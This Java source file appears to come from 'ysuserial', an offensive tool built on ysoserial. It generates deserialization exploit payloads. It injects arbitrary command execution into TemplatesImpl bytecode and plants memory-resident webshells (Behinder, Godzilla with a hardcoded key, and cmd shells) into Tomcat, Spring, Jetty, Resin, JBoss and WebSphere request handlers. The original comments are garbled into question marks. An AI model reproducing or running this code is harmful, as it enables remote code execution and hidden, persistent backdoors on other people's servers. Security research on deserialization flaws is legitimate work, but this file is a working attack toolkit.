package org.su18.ysuserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.zip.GZIPOutputStream;

import javassist.*;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.wicket.util.file.Files;
import org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorMS;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({
		"restriction", "rawtypes", "unchecked"
})
public class Gadgets {

	static {
		// special case for using TemplatesImpl gadgets with a SecurityManager enabled
		System.setProperty(DESERIALIZE_TRANSLET, "true");

		// for RMI remote loading
		System.setProperty("java.rmi.server.useCodebaseOnly", "false");
	}

	public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

	public static class StubTransletPayload extends AbstractTranslet implements Serializable {

		private static final long serialVersionUID = -5971610431559700674L;


		public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
		}


		@Override
		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
		}
	}

	// required to make TemplatesImpl happy
	public static class CheckCPUTime implements Serializable {

		private static final long serialVersionUID = 8207363842866235160L;
	}


	public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
		return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
	}


	public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
		return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
	}


	public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
		final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
		allIfaces[0] = iface;
		if (ifaces.length > 0) {
			System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
		}
		return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
	}


	public static Map<String, Object> createMap(final String key, final Object val) {
		final Map<String, Object> map = new HashMap<String, Object>();
		map.put(key, val);
		return map;
	}


	public static Object createTemplatesImpl(String command) throws Exception {
		command = command.trim();

		String   packageName = "org.su18.ysuserial.payloads.templates.";
		Class<?> clazz;
		Class    tplClass;
		Class    abstTranslet;
		Class    transFactory;

		// ???????????? JDK ??????
		if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
			tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
			abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
			transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
		} else {
			tplClass = TemplatesImpl.class;
			abstTranslet = AbstractTranslet.class;
			transFactory = TransformerFactoryImpl.class;
		}

		// ??????????????????
		if (command.startsWith("'") || command.startsWith("\"")) {
			command = command.substring(1, command.length() - 1);
		}


		// ??????????????? EX- ?????????Extra ???????????????????????????????????????????????????????????? class ???????????????????????????????????????
		if (command.startsWith("EX-")) {
			command = command.substring(3);
			String type = "";

			// ??????????????? MS ????????????????????????????????????
			if (command.startsWith("MS-")) {
				command = command.substring(3);
				packageName += "memshell.";
				String prefix = command.substring(0, 2).toLowerCase();
				switch (prefix) {
					case "tf":
					case "tl":
					case "ts":
						packageName += "tomcat.";
						break;
					case "sp":
						packageName += "spring.";
						break;
					case "jf":
					case "js":
						packageName += "jetty.";
						break;
					case "rf":
					case "rs":
						packageName += "resin.";
						break;
					case "jb":
						packageName += "jboss.";
						break;
					case "ws":
						packageName += "websphere.";
						break;
				}

				String[] commands = command.split("[-]");
				String   name     = commands[0];
				type = command.split("[-]")[1];

				clazz = Class.forName(packageName + name, false, Gadgets.class.getClassLoader());
			} else {
				// ?????????????????????????????????????????????????????? WebappClassLoaderBase ?????????????????????????????????
				clazz = Class.forName(packageName + command, false, Gadgets.class.getClassLoader());
			}

			return createTemplatesImpl(clazz, null, null, type, tplClass, abstTranslet, transFactory);
			// ??????????????? LF- ?????? ???Local File???????????????????????????????????????????????????????????????????????????????????????????????????????????????-??????
		} else if (command.startsWith("LF-")) {
			command = command.substring(3);
			byte[] bs        = Files.readBytes(new File(command.split("[-]")[0]));
			String className = command.split("[-]")[1];
			return createTemplatesImpl(null, null, bs, className, tplClass, abstTranslet, transFactory);
		} else {
			// ?????????????????????????????????
			return createTemplatesImpl(null, command, null, null, tplClass, abstTranslet, transFactory);
		}
	}


	public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, String cName, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
		final T   templates  = tplClass.newInstance();
		byte[]    classBytes = new byte[0];
		ClassPool pool       = ClassPool.getDefault();

		pool.insertClassPath(new ClassClassPath(abstTranslet));
		CtClass superClass = pool.get(abstTranslet.getName());

		CtClass ctClass = null;

		// ?????? Command ???????????????????????????????????????????????? CommandTemplate ????????????
		if (command != null) {
			// ????????????
			String time = String.valueOf(System.nanoTime());
			ctClass = pool.get("org.su18.ysuserial.payloads.templates.CommandTemplate");

			// ??????????????? Thread ???????????????
			String className = ctClass.getName();
			ctClass.setName(className + time);
			// ????????????
			String cmd = "cmd = \"" + command + "\";";
			ctClass.makeClassInitializer().insertBefore(cmd);

			ctClass.setSuperclass(superClass);
			classBytes = ctClass.toBytecode();
		}

		// ?????? myClass ???????????????????????????????????? Class ??????????????????
		if (myClass != null) {
			String className = myClass.getName();
			ctClass = pool.get(className);
			ctClass.setSuperclass(superClass);

			// ??????????????? Spring ??????????????????????????????????????? SpringInterceptorTemplate ?????????????????????????????? SpringInterceptorMS ???
			if (className.contains("SpringInterceptorMS")) {

				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
				CtClass springTemplateClass = pool.get(target);
				// ?????????????????????
				String clazzName = target + System.nanoTime();
				springTemplateClass.setName(clazzName);
				String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
				// ??????b64?????????
				String b64content = "b64=\"" + encode + "\";";
				ctClass.makeClassInitializer().insertBefore(b64content);
				// ?????? SpringInterceptorMemShell ???????????? ????????????????????????
				String clazzNameContent = "clazzName=\"" + clazzName + "\";";
				ctClass.makeClassInitializer().insertBefore(clazzNameContent);
				ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
				classBytes = ctClass.toBytecode();
			} else {
				// ???????????????????????????????????????NeoReg ????????????
				if (!"org.su18.ysuserial.payloads.templates.TLNeoRegFromThread".equals(className)) {
					// ????????????????????????????????????
					ctClass.setName(className + System.nanoTime());
				}

				// ?????????????????????????????????????????????
				if (!Objects.equals(cName, "")) {
					insertKeyMethod(ctClass, cName);
				}

				classBytes = ctClass.toBytecode();
			}
		}
		// ?????? bytes ????????????????????? ClassLoaderTemplate ??????????????????????????????
		if (bytes != null) {
			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
			ctClass.setName(ctClass.getName() + System.nanoTime());
			ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
			GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
			gzipOutputStream.write(bytes);
			gzipOutputStream.close();
			String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
			String className = "className=\"" + cName + "\";";
			ctClass.makeClassInitializer().insertBefore(content);
			ctClass.makeClassInitializer().insertBefore(className);
			ctClass.setSuperclass(superClass);
			classBytes = ctClass.toBytecode();
		}


		// ?????? class ??????
		FileOutputStream fileOutputStream = new FileOutputStream("a.class");
		fileOutputStream.write(classBytes);
		fileOutputStream.flush();
		fileOutputStream.close();

		// ?????? class ??????
//		ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//		Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
//		method.setAccessible(true);
//		Class clazz = (Class) method.invoke(null, classLoader, ctClass.getName(), classBytes, 0, classBytes.length);
//		clazz.newInstance();


		// inject class bytes into instance
		Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(CheckCPUTime.class)});

		// required to make TemplatesImpl happy
		Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
		Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
		return templates;
	}


	public static HashMap makeMap(Object v1, Object v2) throws Exception {
		HashMap s = new HashMap();
		Reflections.setFieldValue(s, "size", 2);
		Class nodeC;
		try {
			nodeC = Class.forName("java.util.HashMap$Node");
		} catch (ClassNotFoundException e) {
			nodeC = Class.forName("java.util.HashMap$Entry");
		}
		Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
		Reflections.setAccessible(nodeCons);

		Object tbl = Array.newInstance(nodeC, 2);
		Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
		Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
		Reflections.setFieldValue(s, "table", tbl);
		return s;
	}

	public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

		// ??????????????? Tomcat ?????????????????? request ????????????????????? payload
		String name = ctClass.getName();
		name = name.substring(name.lastIndexOf(".") + 1);
		boolean isTomcat = name.startsWith("T");

		// ????????? filter ????????? servlet ???????????????????????????????????????????????????
		String method = "";

		CtClass[] classes = ctClass.getInterfaces();
		for (CtClass aClass : classes) {
			String iName = aClass.getName();
			if (iName.equals("javax.servlet.Servlet")) {
				method = "service";
				break;
			} else if (iName.equals("javax.servlet.Filter")) {
				method = "doFilter";
				break;
			} else if (iName.equals("javax.servlet.ServletRequestListener")) {
				method = "requestInitializedHandle";
				isTomcat = false;
				break;
			}
		}

		switch (type) {
			// ????????????????????????
			case "bx":
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));

				if (isTomcat) {
					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL_FOR_TOMCAT));
				} else {
					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL));
				}
				break;
			// ???????????????????????????
			case "gz":
				ctClass.addField(CtField.make("Class payload ;", ctClass));
				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));

				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));

				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
				break;
			// ????????? raw ??????????????????
			case "gzraw":
				ctClass.addField(CtField.make("Class payload ;", ctClass));
				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));

				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));

				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
				break;
			// ???????????????????????????
			case "cmd":
			default:
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));

				if (isTomcat) {
					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
				} else {
					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
				}
				break;
		}
	}

	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
		// ?????????????????????????????????????????????????????????????????????
		CtMethod cm = ctClass.getDeclaredMethod(method);
		cm.setBody(payload);
	}
}
